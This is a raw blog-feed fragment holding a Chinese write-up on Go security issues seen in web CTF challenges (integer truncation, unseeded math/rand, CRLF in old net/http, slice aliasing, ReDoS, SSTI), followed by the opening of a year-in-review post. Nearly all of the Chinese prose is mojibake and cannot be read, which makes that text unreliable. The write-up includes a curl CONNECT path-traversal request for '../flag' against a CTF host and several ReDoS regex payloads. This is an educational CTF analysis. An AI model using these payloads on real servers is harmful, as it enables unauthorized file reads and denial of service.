src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_5ffbbfdc9f0ebffa65ffa3ce5f05a35c.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_5ffbbfdc9f0ebffa65ffa3ce5f05a35c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>åœ¨ç±»å‹è½¬æ¢ä¸­,ä¹Ÿä¼šå‡ºç°è¾ƒå¤§æ•´å‹å‘è¾ƒå°æ•´å‹è½¬æ¢çš„æˆªæ–­é—®é¢˜</p><pre><code class="go">var a int16 = 256var b  = int8(a)fmt.Println(b)// 0 // high-order byte is truncated</code></pre><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ•´å‹å®‰å…¨çš„æ£€æŸ¥ä¹Ÿå‡ºç°åœ¨äº†<a href="https://github.com/securego/gosec" target="_blank" rel="noopener">gosec</a>ä¸­ï¼Œä¸€ä¸ªæ¯”è¾ƒç»å…¸çš„ä¾‹å­å°±æ˜¯ï¼š<code>kubectl</code>å‘½ä»¤è¡Œä¸­å‡ºç°äº†ä¸€ä¸ª<code>strconv.Atoi</code>å¯¼è‡´çš„æˆªæ–­é—®é¢˜ã€‚å½“æˆ‘ä»¬ä¼ å…¥portå‚æ•°çš„å¯¹åº”å­—ç¬¦ä¸²å,å®¹å™¨å¯åŠ¨çš„ç«¯å£è¿™ä¸€å‚æ•°ä¼šå°†ç»Atoiå¤„ç†åçš„å­—ç¬¦ä¸²è¿›è¡Œint32çš„ç±»å‹è½¬æ¢ã€‚ç”±äº64ä½ç³»ç»Ÿçš„intæ˜¯int64ç±»å‹ã€‚è½¬int32çš„è¯ä¼šå‡ºç°æ˜æ˜¾æˆªæ–­<br>å¯ä»¥ç®€åŒ–æˆä»¥ä¸‹ä»£ç ï¼š</p><pre><code class="go">v , _ := strconv.Atoi(&quot;4294967377&quot;)s  := int32(v)fmt.Println(s)// 81</code></pre><p>è¿™æ ·å°±æœ‰å¯èƒ½å¯¼è‡´81ç«¯å£çš„æœåŠ¡å¯åŠ¨ï¼Œæˆ–è€…è¢«åœæ­¢ã€‚æ‰€ä»¥ä½¿ç”¨<code>ParseInt ,ParseUInt</code>ä¼šæ¯”è¾ƒå¥½ã€‚æˆ–è€…å¯¹ç«¯å£å·è¿›è¡Œé™åˆ¶ã€‚</p><p>CTFä¸­å‡ºç°æ•´æ•°æº¢å‡ºçš„scenario ä¸€èˆ¬éƒ½æ˜¯ xx shopä¹‹ç±»çš„ã€‚é€šè¿‡é‡å¤çš„åŠ æ•°è¿›è¡Œæº¢å‡ºç„¶åé‰´æƒã€‚</p><h2 id="pseudo-rand"><a href="#pseudo-rand" class="headerlink" title="pseudo-rand"></a>pseudo-rand</h2><p>golang çš„math/rand åŒ…ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°éšæœºæ•°ç”Ÿæˆçš„å‡½æ•°å½¢å¼</p><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_f6708f74d8bc16d6c4f6d5085e798521.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_f6708f74d8bc16d6c4f6d5085e798521.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è·Ÿè¿›ä¸€ä¸‹å‡½æ•°ä¸ç»“æ„ä½“</p><pre><code class="go">var globalRand = New(&amp;lockedSource{src: NewSource(1).(*rngSource)})......func NewSource(seed int64) Source {    var rng rngSource    rng.Seed(seed)    return &amp;rng}</code></pre><p>å¯ä»¥çœ‹åˆ°,è¿™äº›éšæœºæ•°å‡½æ•°çš„seedé»˜è®¤ä¸º1.ä¹Ÿå°±æ˜¯è¯´å¦‚æœä¸ä½¿ç”¨<code>rand.Seed()</code>ç¡®è®¤ç§å­çš„è¯ï¼Œç”Ÿæˆçš„åªæ˜¯æ‰€è°“çš„ä¼ªéšæœºæ•°ã€‚</p><p>è¿™ç§é—®é¢˜å¯èƒ½ä¼šå‡ºç°åœ¨å¼€å‘è€…ç›´æ¥ç”¨randç”Ÿæˆçš„å­—ç¬¦ä¸²ä½œä¸ºå¯†é’¥çš„åœºæ™¯ï¼Œæ¯”å¦‚ginçš„cookieçš„key.ä»è€Œå¯¼è‡´æœ¬åœ°å¤ç°ï¼Œç›´æ¥é‰´æƒã€‚</p><h2 id="go-net-http"><a href="#go-net-http" class="headerlink" title="go net/http"></a>go net/http</h2><h3 id="net-http-lt-1-11-CRLF"><a href="#net-http-lt-1-11-CRLF" class="headerlink" title="net/http &lt; 1.11 CRLF"></a>net/http &lt; 1.11 CRLF</h3><p>ä½ç‰ˆæœ¬çš„httpåº“ä¼šå¯¼è‡´CRLF.æ¯”å¦‚<code>http.NewRequest()</code>ã€‚è²Œä¼¼æ˜¯åŸæœ¬æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯åœ¨ä¸€æ¬¡å‡çº§ä¸­ç–å¿½äº†å¯¼è‡´é‡æ–°å‡ºç°<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_c155e0320b2e007aeda1c3d2f4b63b37.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_c155e0320b2e007aeda1c3d2f4b63b37.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>ç°åœ¨ä¼šçœ‹åˆ°å­˜åœ¨é™åˆ¶ï¼Œæˆ‘ä»¬æ— æ³•ä¼ å…¥<code>\r\n</code>çš„å­—ç¬¦</p><p>WMCTFä¸­çš„gogogoå‡ºç°è¿‡è¿™ä¸€æ¼æ´ï¼Œåˆ©ç”¨è‡ªç„¶æ˜¯é€šè¿‡CRLFå‘é€POSTè¯·æ±‚è¿›è¡Œç»•è¿‡ä¸ä¸Šä¼ ã€‚</p><h3 id="weird-stuff"><a href="#weird-stuff" class="headerlink" title="weird stuff"></a>weird stuff</h3><p>åœ¨ä¹‹å‰çš„<a href="https://ctftime.org/event/1050" target="_blank" rel="noopener">justCTF</a>ä¸­ï¼Œå‡ºç°äº†ä¸€é“goé¢˜ã€‚é¢˜ç›®åŸæœ¬çš„æ¼æ´æ˜¯ç”±å‡ºé¢˜äººå‘ç°çš„ä¸€ä¸ªissue<a href="https://github.com/golang/go/issues/40940" target="_blank" rel="noopener">https://github.com/golang/go/issues/40940</a> åŠ ä¸Šå…¶å¯¹fileServerä¸€äº›ä»£ç çš„é­”æ”¹ç»„åˆçš„ã€‚</p><p>ç®€å•é™ˆè¿°ä¸‹çš„è¯ï¼Œé¢˜ç›®æä¾›äº†ä¸€ä¸ªgo httpèµ·çš„FileServer</p><pre><code class="go">http.Handle(&quot;/&quot;, http.FileServer(http.Dir(&quot;/tmp&quot;)))</code></pre><p>flagå°±åœ¨å…¶æä¾›æ–‡ä»¶æœåŠ¡çš„æ–‡ä»¶å¤¹ä¸‹ï¼Œä½†æ˜¯ï¼Œå‡ºé¢˜äººåŠ ä¸Šäº†webæœåŠ¡çš„flagè·¯ç”±,ä»è€Œä½¿å¾—æˆ‘ä»¬æ²¡æ³•é€šè¿‡ç›´æ¥è®¿é—®<code>/flag</code>æ¥è·å–æ–‡ä»¶ã€‚è€Œæ˜¯å¾—åˆ°<code>/flag</code>è·¯ç”±çš„å›æ˜¾ã€‚</p><p>å‡ºé¢˜äººçš„æ„å›¾æ˜¯åˆ©ç”¨å…¶æŒ–æ˜åˆ°çš„è¿™ä¸ªæ¼æ´ï¼Œé€ æˆé”™è¯¯çš„æ–‡ä»¶è¯»å–èŒƒå›´ã€‚é€šè¿‡è®¿é—®å…¶ä»–æ–‡ä»¶è¶Šç•Œè¯»åˆ°flag.(httpçš„Fileserveråœ¨æˆ‘ä»¬è®¿é—®æ—¶ï¼Œä¼šå…ˆæ ¹æ®æˆ‘ä»¬è®¿é—®çš„urlè¿›è¡Œä¸€ç³»åˆ—å¤„ç†ï¼Œæœç»è·¯å¾„ç©¿è¶Šçš„url,ä¹‹åè¿›è¡Œæ–‡ä»¶è¯»å–è¿”å›ç»™ç”¨æˆ·)</p><p>ä½†æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„æ—¶ï¼Œæ¯”èµ›ä¸­å‡ºç°äº†ä¸€ä¸ªéé¢„æœŸè¯»flagçš„æ–¹å¼<br><code>curl --path-as-is -X CONNECT http://gofs.web.jctf.pro/../flag</code></p><p>ç®€å•è¯´å°±æ˜¯ç”¨CONNECTè¯·æ±‚+è·¯å¾„ç©¿è¶Šçš„urlè¯»å–åˆ°äº†æ–‡ä»¶ã€‚æˆ‘ä»¬çœ‹çœ‹æºç æ˜¯æ€ä¹ˆå¤„ç†çš„<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_f9abcabe3b0a17bac5f8e41a586d74ab.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_f9abcabe3b0a17bac5f8e41a586d74ab.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å¦‚æœæ˜¯CONNECTæ–¹å¼è¯·æ±‚ï¼Œå°±ä¸ä¼šå¤„ç†urlä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚å¯¼è‡´ç›´æ¥è¯»å–flag.å…¶ä»–çš„è¯·æ±‚æ–¹æ³•éƒ½ä¼šåœ¨<code>cleanPath</code>ä¸­è¢«å¤„ç†url</p><p>ç®—æ˜¯ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„é—®é¢˜ã€‚ä¸è¿‡golang1.16ä¼¼ä¹å·²ç»å¤„ç†äº†ã€‚ä½†æ˜¯åŒ…æ‹¬æˆ‘åœ¨å†…çš„å¤§éƒ¨åˆ†åº”è¯¥è¿˜æ˜¯ä½¿ç”¨çš„go1.15åŠä»¥ä¸‹ç‰ˆæœ¬ï¼Œæ‰€ä»¥è¿˜æ˜¯å€¼å¾—æ³¨æ„çš„</p><h2 id="feature-of-slice"><a href="#feature-of-slice" class="headerlink" title="feature of slice"></a>feature of slice</h2><p>ä¹‹å‰åœ¨åšbuuä¸Šçš„roarCTFæ—¶é‡åˆ°ä¸€é“goé¢˜ï¼Œå…¶ä¸­ä¸€ä¸ªåˆ©ç”¨ç‚¹æ¥è‡ªConfidence CTF,å…¶ä¸­ç”¨åˆ°äº†golang sliceçš„ä¸€ä¸ªfeature</p><pre><code class="go">a := make([]uint64, 0)a = append(a, 1)a = append(a, 2)a = append(a, 3)b := append(a, 4)c := append(a, 5)fmt.Println(a)fmt.Println(b)fmt.Println(c)//result://[1 2 3]//[1 2 3 5]//[1 2 3 5]</code></pre><p>æŒ‰ç…§ç›´è§‰æ¥è¯´ï¼Œbè¿™é‡Œåº”è¯¥æ˜¯<code>[1,2,3,4]</code>,ä½†å®é™…ä¸Šå´æ˜¯<code>[1,2,3,5]</code><br>è¿™å°±ä¸golangçš„sliceä¹Ÿå°±æ˜¯åˆ‡ç‰‡çš„ç»“æ„ç›¸å…³äº†</p><pre><code class="go">type slice struct {    array unsafe.Pointer // ptr    len   int    cap   int}</code></pre><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_07c51c4e5face9078a0c61cadce82aa7.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_07c51c4e5face9078a0c61cadce82aa7.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>sliceç»“æ„ä¸­çš„capæ˜¯æŒ‰2çš„å€æ•°æ‰©å®¹çš„ã€‚æ‰€ä»¥è¯´å½“æˆ‘ä»¬<code>append(3)</code>æ—¶ä¼šå‘ç”Ÿç¬¬ä¸€æ¬¡æ‰©å®¹ï¼Œæ­¤æ—¶lenä¸º3ï¼Œcapä¸º<code>2*2=4</code>.<br>æ‰§è¡Œ<code>b := append(a, 4)</code>æ—¶ï¼Œæˆ‘ä»¬çš„4ä¼šè¢«æ”¾åœ¨æŒ‡é’ˆptrçš„ç¬¬å››ä¸ªä½ç½®ã€‚ç„¶åè¿”å›ptr len=4 cap=4ç»™bã€‚ä¸è¿‡è¿™å¹¶æ²¡æœ‰æ”¹å˜açš„ç»“æ„ï¼ˆsliceåªæ˜¯æŒ‡å‘å†…å­˜çš„æŒ‡é’ˆï¼‰ä¹‹åè¿›è¡Œ<code>c := append(a, 5)</code>æ—¶ï¼Œç”±äºaæ²¡å˜ï¼Œæ–°å…ƒç´ åªä¼šè¦†ç›–ä¹‹å‰bé‚£æ”¾ä¸Šçš„4.</p><p>é‚£ä¸€é“é¢˜ç›®å°±æ˜¯åˆ©ç”¨è¿™ç‚¹ï¼Œå¯ä»¥é€šè¿‡å…ˆbegä¸‰æ¬¡æ„é€ å‡ºlen=3,cap=4çš„åˆ‡ç‰‡ï¼Œé€šè¿‡é¢˜ç›®ä¸­ä¸€ä¸ªappendè¶…å¤§éšæœºæ•°çš„æœºä¼šï¼Œåœ¨ä¸‹ä¸€æ¬¡begæ—¶è¾¾æˆå…ƒç´ è¦†ç›–ã€‚</p><p>è¿™ä¸ªå¯ä»¥ç®—æ˜¯sliceçš„feature,è¿˜æ˜¯å¾ˆæœ‰æ„æ€çš„ã€‚</p><h2 id="reDOS"><a href="#reDOS" class="headerlink" title="reDOS"></a>reDOS</h2><p>åŸæœ¬æ˜¯ä»¥ä¸ºgolangä¸å­˜åœ¨reDOSçš„é—®é¢˜çš„ã€‚å½“åˆé˜…è¯»lmt-swallowçš„æ–‡ç« æ—¶ä¹Ÿçœ‹åˆ°ä»–æåˆ°golangæœ‰linear time matchingã€‚ ä¸è¿‡åæ¥å‘ç°è¿˜æ˜¯æœ‰é€”å¾„çš„ã€‚</p><p>å½“ç„¶ï¼ŒreDOSä¸»è¦è¿˜æ˜¯åœ¨jsé‡Œå½±å“æ¯”è¾ƒå¤§ï¼Œå› ä¸ºå…¶äº‹ä»¶é˜Ÿåˆ—é˜»å¡å¯¹äºwebæœåŠ¡çš„å½±å“æ˜¯å·¨å¤§çš„ã€‚ç›¸æ¯”ä¹‹ä¸‹å…¶ä»–çš„DOSå½±å“å¯èƒ½å°±è¾ƒå°ã€‚ç”¨nginxåšä¸ªå¤„ç†åŸºæœ¬å°±æ²¡æœ‰å½±å“ã€‚ä¸è¿‡ï¼Œå¦‚æœæ˜¯ä»¥<code>Blind regex injection</code>ä¸ºç›®çš„è€ƒè™‘reDOSçš„è¯ï¼Œå°±å¦å½“åˆ«è®ºäº†ã€‚</p><p>å›åˆ°golangä¸Šã€‚golangä½¿ç”¨çš„æ­£åˆ™å¼•æ“æ˜¯re2ã€‚ä½†æ˜¯ç”¨çš„æ˜¯æ— å›æº¯æœºåˆ¶(DFA)ã€‚<br>æ‰€ä»¥ä¹‹å‰çš„payloadå¦‚<code>^(?=(PAYLOAD))((.*)*)*salt$</code>å°±æ— æ•ˆäº†</p><p>ä½†æ˜¯,é€šè¿‡å…¶ä»–æ–¹æ³•åˆ¶é€ å»¶æ—¶ä»ç„¶æ˜¯å¯è¡Œçš„ã€‚æ¯”å¦‚re2å¯¹äº<code>{n}</code>è¿™æ ·çš„æ­£åˆ™ï¼Œnå­˜åœ¨æœ‰ä¸Šé™1000ï¼Œä¸”å¯¹äºDFAçŠ¶æ€æ•°æ²¡æœ‰é™åˆ¶.æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸æ–­é‡å¤<code>(.?){1000}</code>æ¥åˆ¶é€ è¶³å¤Ÿçš„DFAçŠ¶æ€è¿›è¡Œä¸€å®šç¨‹åº¦ä¸Šçš„å»¶æ—¶</p><p>reDOSå…¶å®ä¸€ç›´æ˜¯ä¸€ä¸ªå¾ˆæœ‰æ„æ€çš„ç‚¹,é™¤äº†å–œé—»ä¹è§çš„nodejs,å‰ç«¯ä¸­xssä¹Ÿå¯ä»¥å¯¼è‡´è¿™ä¸ªé—®é¢˜ï¼Œä»è€Œxsleak ,rubyä¸­ä¹Ÿæœ‰ç±»ä¼¼é—®é¢˜ã€‚å½“ç„¶ï¼Œå¦‚æœæ˜¯ä»reDOSå¼•ç”³åˆ°æ­£åˆ™ç›²æ³¨çš„è¯ï¼Œsqlæ³¨å…¥ä¸­å€’ä¹Ÿæœ‰ç±»ä¼¼çš„æƒ…å†µã€‚æ€»ä¹‹å°±æ˜¯åˆ©ç”¨å·®å¼‚æ€§è¿›è¡Œæ•°æ®æå–ã€‚å¯æƒœå› ä¸ºå¤ªå®¹æ˜“åç¯å¢ƒäº†ï¼Œæ‰€ä»¥å¾ˆéš¾å‡ºé“é¢˜åˆ°æ¯”èµ›ä¸­ :(</p><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>æœ€åä¸€ä¸ªå°±ç®€å•æä¸€ä¸‹ssti.è¦è¯´golangè¿™ç§é™æ€ç¼–è¯‘è¿˜ä¼šå‡ºsstiè¿˜æ˜¯æŒºéš¾çš„( é™¤éæºç ä¸­ç”¨sprintf æˆ–è€…è¯´æ‹¼æ¥æ¥æ„å»ºtemplateçš„å‚æ•°</p><pre><code class="go">var tmpl = fmt.Sprintf(`&lt;h2&gt;No search results for %s&lt;/h2&gt;`, xxx)</code></pre><p>golangçš„templateè·Ÿå¾ˆå¤šæ¨¡æ¿å¼•æ“çš„è¯­æ³•å·®ä¸å¤šï¼Œæ¯”å¦‚åŒèŠ±æ‹¬å·æŒ‡å®šå¯è§£æçš„å¯¹è±¡ã€‚<code>.xxx</code>è¡¨ç¤ºä¸€ä¸ªå¯¹è±¡çš„xxxå±æ€§ã€‚<code>.</code>å°±æ˜¯å½“å‰ä½œç”¨åŸŸçš„å½“å‰å¯¹è±¡ï¼ŒåŸºæœ¬å°±è·Ÿhandlebarsé‡Œçš„thiså·®ä¸å¤šã€‚</p><p>å‡å¦‚æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°æ˜¯å¯è§£æçš„,å°±æœ‰å¯èƒ½æ³„éœ²templateåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å¼•å…¥çš„å¯¹è±¡å†…å®¹(æ‰§è¡Œçš„æœ¬è´¨å°±æ˜¯åˆå¹¶æ›¿æ¢)</p><p>ç®€å•çš„demoå¯ä»¥å‚è€ƒè¿™é‡Œ <a href="https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html" target="_blank" rel="noopener">https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html</a></p><p>å¦‚æœä¼ å…¥çš„structå±æ€§å«æœ‰æŒ‡é’ˆçš„è¯(éå¸¸å¸¸è§ï¼Œå› ä¸ºç”¨æŒ‡é’ˆå¯ä»¥èŠ‚çœå¾ˆå¾ˆå¤šç©ºé—´),æˆ‘ä»¬sstiçš„å›æ˜¾å°±åªæ˜¯ä¸€ä¸ªåœ°å€ã€‚éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨å»è®¿é—®å±æ€§æ‰ä¼šè§£å¼•</p><h2 id="Summary-amp-amp-Reference"><a href="#Summary-amp-amp-Reference" class="headerlink" title="Summary &amp;&amp; Reference"></a>Summary &amp;&amp; Reference</h2><p>ç®€å•çš„æ¢³ç†ä¸‹è‡ªå·±è§è¿‡çš„golangå®‰å…¨é—®é¢˜(CTF-based web go)ã€‚å…¶å®åƒä¹‹å‰dasCTFä¸­ä¹Ÿæœ‰golangçš„é¢˜ç›®ï¼Œç”¨gobåºåˆ—åŒ–å­˜å†…å®¹åˆ°cookieï¼Œä¸è¿‡åˆ©ç”¨ç‚¹ä¸goçš„å…³ç³»ä¸º0ï¼Œæ‰€ä»¥ä¸è°ˆã€‚</p><p>è‡ªå·±golangçš„å¼€å‘è¿˜æœ‰å¾ˆå¤šå€¼å¾—å»å­¦çš„ï¼Œè¿™é—¨è¯­è¨€ç¡®å®æœ‰å…¶ä¼˜è¶Šä¹‹å¤„ä»¥åŠä¸€äº›å¯èƒ½å­˜åœ¨å¹¶è¢«æŒ–æ˜çš„å®‰å…¨é—®é¢˜</p><p><a href="https://github.com/tsg-ut/tsgctf2020" target="_blank" rel="noopener">https://github.com/tsg-ut/tsgctf2020</a><br><a href="https://annevi.cn/2020/08/14/wmctf2020-gogogo-writeup/" target="_blank" rel="noopener">https://annevi.cn/2020/08/14/wmctf2020-gogogo-writeup/</a><br><a href="https://github.com/golang/go/issues/30794" target="_blank" rel="noopener">https://github.com/golang/go/issues/30794</a><br><a href="https://github.com/golang/go/issues/40940" target="_blank" rel="noopener">https://github.com/golang/go/issues/40940</a><br><a href="https://github.com/mwarzynski/confidence2019_teaser_lottery" target="_blank" rel="noopener">https://github.com/mwarzynski/confidence2019_teaser_lottery</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Farewell to 2020</title>
      <link href="2020/12/30/Farewell-to-2020/"/>
      <url>2020/12/30/Farewell-to-2020/</url>
      
        <content type="html"><![CDATA[<p>Time to say goodbye</p><a id="more"></a><p>2020é©¬ä¸Šå°±ç»“æŸäº†ã€‚æŒ‰å¾€å¹´çš„æƒ¯ä¾‹ï¼Œæ€»è¦å†™ç¯‡æ–‡ç« å›é¡¾ä¸‹è‡ªå·±ä¸€å¹´çš„ç»å†çš„ã€‚å› æ­¤å°±ç»§ç»­çŸ«æƒ…çš„è®°å½•ä¸‹å§ã€‚</p><p>è¿˜è®°å¾—1æœˆä»½åˆæ—¶ä¸€å †æœŸæœ«è€ƒè¯•æ‰å †ï¼Œå½“æ—¶æœŸæœ«æ€»å…±è€ƒäº†12é—¨ï¼Œäººéƒ½è€ƒå‚»äº†ã€‚æœ€å10å·æ—©ä¸Šé‡å­ç‰©ç†è€ƒå®Œç›´æ¥å†²å›å¯å®¤è·Ÿå®¤å‹ç©é¥¥è’æ”¾æ¾2333ã€‚ç„¶åç¬¬äºŒå¤©å°±å¼€å§‹åšylgç¾¤é‡Œå‘çš„code-breaking é¢˜ç›®è¿˜æœ‰ä¸€äº›ctfé¢˜ã€‚è€å®è¯´ï¼Œå½“æ—¶è¿˜å•¥éƒ½ä¸ä¼šï¼ŒåŸºæœ¬è‡ªå·±åšä¹Ÿä¸€è„¸æ‡µé€¼ã€‚ä¸è¿‡åæ­£ä»¥å‡†å¤‡æ•°æ¨¡ç¾èµ›ä¸ºç†ç”±ç•™åœ¨å­¦æ ¡äº†ï¼ˆç»“æœæ•°æ¨¡çŸ¥è¯†å•¥ä¹Ÿæ²¡å­¦XPï¼‰ï¼Œç„¶åå°±å¯ä»¥èŠ±å¾ˆé•¿æ—¶é—´çœ‹wp,å¤ç°ã€‚è¯´å®è¯æ”¶è·è¿˜æŒºå¤§çš„ã€‚</p><p>å½“æ—¶å®šäº†ä¸ªå°ç›®æ ‡ï¼Œå›æ­¦æ±‰å‰æ¯å¤©éƒ½æœ‰äº§å‡ºï¼Œè¿˜æ˜¯æŒºéš¾å¾—åšåˆ°äº†ã€‚<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_905e7a34a95931ff77952e7df45d94ee.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_905e7a34a95931ff77952e7df45d94ee.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>1.16å›æ­¦æ±‰äº†ï¼Œå¥½åƒå›å»ç¬¬ä¸€å¤©å°±æŠŠç”µè„‘æ³¼äº†æ°´å¯¼è‡´ç”¨ä¸äº†äº†ã€‚ã€‚ã€‚ç„¶åè·Ÿè€çˆ¸å»ä¿®ç”µè„‘é¡ºä¾¿åƒäº†å›çƒ§çƒ¤ã€‚åé¢çš„äº‹å°±ä¸ç”¨è¯´äº†ï¼Œç–«æƒ…çªç„¶çˆ†å‘ï¼Œæ­¦æ±‰è¿˜ååæ˜¯æ ¸å¿ƒåœ°åŒºï¼Œç›´æ¥å°åŸã€‚æˆ‘ä»¬ä¹Ÿåªèƒ½å‘†åœ¨å®¶é‡Œåšå¥½è‡ªæˆ‘é˜²æŠ¤ã€‚</p><p>  å®è¯è¯´ï¼Œé‚£æ®µæ—¶é—´çš„ç¡®æœ‰äº›äººå¿ƒæƒ¶æƒ¶ã€‚èº«è¾¹äººåæ˜ å‡ºçš„åŒ»é™¢ä¹±è±¡è¿œæ¯”æŠ¥é“çš„æƒŠäººï¼Œå†è€…ï¼Œæ–°å† å¨åŠ›ç¡®å®æƒŠäººï¼Œæ¯å¤©çœ‹åˆ°é‚£äº›æ•°å­—çš„å¢åŠ ï¼Œå¿ƒé‡ŒçœŸçš„ä¸æ˜¯æ»‹å‘³ï¼Œä½†æ˜¯ä¹Ÿåªèƒ½é»˜é»˜ç¥ˆç¥·ç–«æƒ…èµ¶å¿«è¿‡å»ã€‚</p><p>  ç„¶è€Œåœ¨å®¶çš„æœ€å¤§å¥½å¤„å°±æ˜¯å¯ä»¥å°½æƒ…æ‰“ctfäº†ã€‚æœ¬æ¥å¤§äºŒä¸Šè¯¾å¤šåˆ°è‡ªå·±æ ¹æœ¬æ²¡æ—¶é—´å»å­¦ä¹ ï¼Œå»è®¤çœŸåšå‡ é“é¢˜ç›®ã€‚ç°åœ¨å®…åœ¨å®¶é‡Œçš„ç¡®å¾ˆé€‚åˆç›¯ç€ç”µè„‘ï¼Œå­¦äº›æ„Ÿå…´è¶£çš„çŸ¥è¯†æˆ–è€…å¤ç°å‡ é“é¢˜ç›®äº†ã€‚æ°å¥½vidar-teamå¸ˆå‚…ä»¬ä¸¾åŠäº†hgameï¼Œäºæ˜¯å°±åˆå®šäº†ä¸ªå°ç›®æ ‡ï¼šå°½é‡ak æ‰æ¯å‘¨çš„web.(ç»“æœåˆ°week3å°±akä¸äº†orz.xssæ²¡åšå‡ºæ¥)</p><p>  ç„¶åå¥½åƒå°±å»æ‰“äº†å‡ å¤©æ•°æ¨¡ï¼Œæ°´äº†ç¯‡ç¾èµ›è®ºæ–‡ã€‚å½“æ—¶è‡ªå·±åŸºæœ¬å°±æŒ‰æ‰˜ç¦ä½œæ–‡çš„ä¸€äº›å¥—è·¯å†™çš„ï¼Œæœ€åå†™å‡ºæ¥æœ‰äº›å†…å®¹ä¸å¿ç›´è§†ã€‚ã€‚ã€‚å»ºæ¨¡ä¹Ÿæ˜¯çå»ºçš„ã€‚æœ€åå±…ç„¶æ··äº†ä¸ªHå¥–ï¼Ÿï¼Ÿäºæ˜¯æœæ–­å¼ƒå‘æ•°æ¨¡ï¼Œå¤ªç„å­¦äº†ã€‚</p><p>  ç„¶åç¬¬ä¸€æ¬¡æ‰“æ¯”è¾ƒå®Œæ•´çš„ctfåº”è¯¥å°±æ˜¯é‚£ä¸ªæ–°æ˜¥æˆ˜å½¹äº†ã€‚<br>  <img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_304b2190328a70c20ff8aadc1f898956.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_304b2190328a70c20ff8aadc1f898956.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" 